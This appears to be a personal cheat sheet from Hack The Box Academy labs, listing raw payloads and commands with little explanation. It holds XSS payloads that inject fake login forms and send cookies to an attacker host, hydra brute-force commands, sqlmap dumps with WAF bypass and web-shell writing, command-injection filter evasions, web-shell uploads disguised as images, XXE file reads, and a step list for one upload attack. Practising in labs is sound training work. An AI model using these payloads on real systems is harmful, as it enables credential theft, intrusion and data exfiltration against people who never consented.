# HTB_Academy
HTB_Academy Resources

```bash
https://10.129.252.57/phishing/index.php?url='/><script>document.write('<h3>Please login to continue</h3><form action=http://10.0.2.4:1234><input type="username" name="username" placeholder="Username"><input type="password" name="password" placeholder="Password"><input type="submit" name="submit" value="Login"></form>');document.getElementById('urlform').remove();</script><!--

'/><script>document.write('<h3>Please login to continue</h3><form action=http://0.0.0.0:3333><input type="username" name="username" placeholder="Username"><input type="password" name="password" placeholder="Password"><input type="submit" name="submit" value="Login"></form>');</script><!--

http://10.129.252.57/phishing/index.php?url=%27%2F%3E%3Cscript%3Edocument.write%28%27%3Ch3%3EPlease+login+to+continue%3C%2Fh3%3E%3Cform+action%3Dhttp%3A%2F%2F10.10.14.187%3E%3Cinput+type%3D%22username%22+name%3D%22username%22+placeholder%3D%22Username%22%3E%3Cinput+type%3D%22password%22+name%3D%22password%22+placeholder%3D%22Password%22%3E%3Cinput+type%3D%22submit%22+name%3D%22submit%22+value%3D%22Login%22%3E%3C%2Fform%3E%27%29%3Bdocument.getElementById%28%27urlform%27%29.remove%28%29%3B%3C%2Fscript%3E%3C%21--

<script>document.write('<h3>Please login to continue</h3><form action=http://0.0.0.0:3333><input type="username" name="username" placeholder="Username"><input type="password" name="password" placeholder="Password"><input type="submit" name="submit" value="Login"></form>');</script>

https://10.129.252.57/phishing/index.php?url='/><script>document.write('<h3>Please login to continue</h3><form action=http://0.0.0.0><input type="username" name="username" placeholder="Username"><input type="password" name="password" placeholder="Password"><input type="submit" name="submit" value="Login"></form>');document.getElementById('urlform').remove();</script><!--

http://10.129.89.206/phishing/index.php?url='/%3E%3Cscript%3Edocument.write('%3Ch3%3EPlease%20login%20to%20continue%3C/h3%3E%3Cform%20action=http://0.0.0.0:3333%3E%3Cinput%20type=%22username%22%20name=%22username%22%20placeholder=%22Username%22%3E%3Cinput%20type=%22password%22%20name=%22password%22%20placeholder=%22Password%22%3E%3Cinput%20type=%22submit%22%20name=%22submit%22%20value=%22Login%22%3E%3C/form%3E');document.getElementById('urlform').remove();%3C/script%3E%3C!--

http://10.129.79.110/phishing/index.php?url=%27%2F%3E%3Cscript%3Edocument.write%28%27%3Ch3%3EPlease+login+to+continue%3C%2Fh3%3E%3Cform+action%3Dhttp%3A%2F%2F0.0.0.0%3A3333%3E%3Cinput+type%3D%22username%22+name%3D%22username%22+placeholder%3D%22Username%22%3E%3Cinput+type%3D%22password%22+name%3D%22password%22+placeholder%3D%22Password%22%3E%3Cinput+type%3D%22submit%22+name%3D%22submit%22+value%3D%22Login%22%3E%3C%2Fform%3E%27%293C%2Fscript%3E%3C%21--

http://10.129.79.110/phishing/index.php?url='/%3E%3Cscript%3Edocument.write('%3Ch3%3EPlease%20login%20to%20continue%3C/h3%3E%3Cform%20action=http://0.0.0.0:3333%3E%3Cinput%20type=%22username%22%20name=%22username%22%20placeholder=%22Username%22%3E%3Cinput%20type=%22password%22%20name=%22password%22%20placeholder=%22Password%22%3E%3Cinput%20type=%22submit%22%20name=%22submit%22%20value=%22Login%22%3E%3C/form%3E');document.getElementById('urlform').remove();%3C/script%3E%3C!--

http://10.129.79.110/phishing/index.php?url='/%3E%3Cscript%3Edocument.write('%3Ch3%3EPlease%20login%20to%20continue%3C/h3%3E%3Cform%20action=http://0.0.0.0:3333%3E%3Cinput%20type=%22username%22%20name=%22username%22%20placeholder=%22Username%22%3E%3Cinput%20type=%22password%22%20name=%22password%22%20placeholder=%22Password%22%3E%3Cinput%20type=%22submit%22%20name=%22submit%22%20value=%22Login%22%3E%3C/form%3E');document.getElementById('urlform).remove();%3C/script%3E%3C!--



"><script>new Image().src='http://10.10.14.187:3333/index.php?c='+document.cookie;</script>

"><script src=http://10.10.14.187:3333/marcos></script>

"><script src=http://10.10.14.187:3333/script.js></script>

dig @10.129.29.36 NS axfr internal.inlanefreight.htb


hydra -L /usr/share/commix/src/txt/usernames.txt -P /usr/share/wordlists/rockyou.txt -u -f 165.22.115.189 -s 32596 http-get /

hydra -l user -P /usr/share/wordlists/rockyou.txt -f 165.22.115.189 -s 32596 http-post-form "/admin_login.php:user=^USER^&pass=^PASS^:F=<form name='log-in'"

hydra -l b.gates -P william.txt -u -f ssh://159.65.52.8:31047 -t 4

 curl -s http://10.129.51.125 -H "HOST: www.inlanefreight.htb"

SELECT * FROM titles WHERE emp_no > 10000 OR title NOT LIKE 'engineer';


sqlmap 'http://165.227.231.233:31605/case2.php' --data 'id=1' --batch --dump

sqlmap -u "http://165.227.231.233:31605/case3.php" --cookie='id=1*' --batch --dump


sqlmap 'http://144.126.226.105:31782/case5.php?id=1' --batch --dump -T flag5 --no-cast --level=5 --risk=3

sqlmap 'http://144.126.226.105:31782/case7.php?id=1' --batch --dump -T flag7 --level=5 --risk=3 --random-agent --union-cols=5

sqlmap 'http://167.99.195.247:30124/case1.php?id=1' --search -C password

sqlmap 'http://167.99.195.247:30124/case1.php?id=1' --dump -D testdb -T users -C password

sqlmap -u "http://143.110.166.29:30905/case8.php" --data="id=1&t0ken=6nABRaW19tnyw5aORaa7yOydGDst7GgLOZsBoptU" --csrf-token="t0ken" --batch --dump -T flag8

sqlmap -u "http://143.110.166.29:30905/case9.php?id=1&uid=964600979" --randomize=uid --batch --dump -T flag9

sqlmap -u "http://143.110.166.29:30905/case10.php" --data="id=1" --batch --dump -T flag10 --random-agent

sqlmap -u "http://143.110.166.29:30905/case11.php?id=1" --skip-waf --batch --dump -T flag11 --tamper=between

sqlmap -u "http://143.110.166.29:32640/?id=1" --file-read "/var/www/html/flag.txt"



sudo nano shell.php

chmod 777 ./shell.php

sqlmap -u "http://143.110.166.29:32640/?id=1" --file-write "shell.php" --file-dest "/var/www/html/shell.php"

curl http://143.110.166.29:32640/shell.php?cmd=cat+../../../flag.txt

sqlmap -r a.txt --batch --dump --no-cast --tamper=between -D production -T final_flag



ip=127.0.0.1%0a${IFS}ls$09${PATH:0:1}home

ip=127.0.0.1%0a${IFS}c"a"t$09${PATH:0:1}home${PATH:0:1}1nj3c70r${PATH:0:1}flag.txt

ip=127.0.0.1%0abas$@h<<<$(ba$@se6$@4${IFS}-d<<<ZmluZCAvdXNyL3NoYXJlLyB8IGdyZXAgcm9vdCB8IGdyZXAgbXlzcWwgfCB0YWlsIC1uIDE=)

/index.php?to=&from=51459716.txt%26c"a"t%09${PATH:0:1}flag.txt&finish=1&move=1



http://161.35.45.24:30748/profile_images/shell.php?cmd=cat%20../../../../flag.txt

http://161.35.45.24:30472/profile_images/shell.jpg.phar?cmd=cat%20../../../../flag.txt

http://161.35.45.24:30408/profile_images/shell.gif.phar?cmd=cat%20../../../../flag.txt
GIF8
Content-Type: image/gif

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<svg>&xxe;</svg>

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=upload.php"> ]>
<svg>&xxe;</svg>
Base64 in response

<!DOCTYPE html>
<html>
<body>

<?php
$fileName = "shell.phar.jpeg";
$type = "image/jpeg";
if (!preg_match('/^.+\.[a-z]{2,3}g$/', $fileName)) {
    echo "Only images are allowed";
    die();
}
    if (!preg_match('/image\/[a-z]{2,3}g/', $type)) {
        echo "Only images are allowed";
        die();
    }
    if (preg_match('/.+\.ph(p|ps|tml)/', $fileName)) {
    echo "Extension not allowed";
    die();
}
echo "Good";
?>

</body>
</html>

ÿØÿà

http://144.126.234.86:30226/contact/user_feedback_submissions/230125_shell.phar.jpeg?cmd=cat%20../../../../../flag_2b8f1d2da162d8c44b3696a1dd8a91c9.txt

Subir jpeg normal
fuzzing content type and extensions
subir svg con xxe para ver el codigo de upload.php y el otro
ver donde se guarda la foto y el formato con la fecha
coger la foto del principio y editarla para dejar la cabecera y meter el payload php
acceder a la foto con el payload: http://144.126.234.86:30226/contact/user_feedback_submissions/230125_shell.phar.jpeg?cmd=cat%20../../../../../flag_2b8f1d2da162d8c44b3696a1dd8a91c9.txt


grep '[[:upper:]]' /home/marcos/htb-academy/broken_authentication/SecLists-master/Passwords/Leaked-Databases/rockyou-50.txt | grep -E '[0-9]{1,4}'

 grep -E '^[A-Z]' /usr/share/wordlists/rockyou.txt | grep '[0-9]$' | grep '[^A-Za-z0-9]' | awk 'length >= 20 && length <= 29'
```
